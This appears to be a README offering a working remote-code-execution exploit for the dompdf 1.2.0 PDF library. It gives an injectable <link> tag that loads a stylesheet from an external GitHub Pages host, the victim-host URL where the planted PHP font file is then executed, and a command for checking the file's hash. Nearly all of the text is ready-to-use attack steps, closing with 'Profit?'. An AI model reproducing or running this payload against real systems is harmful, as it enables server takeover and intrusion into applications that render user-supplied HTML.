# Live RCE exploit for dompdf 1.2.0

1. Use the following <link> tag in any injectable field: 
   - `<link rel=stylesheet href='https://abhishekg999.github.io/dompdf/exploit.css'>`
2. Navigate to `http://[VICTIM_HOST]/dompdf/lib/fonts/exploitfont_normal_de7ec71473780093df11e62fab83211f.php`
3. Profit?


The hash should be correct, you can verify the hash yourself:
```console
user@console:~$ echo -n [PHP_PAYLOAD_URL_AT_IT_IS_IN_THE_CSS_FILE] | md5sum
de7ec71473780093df11e62fab83211f  -
```
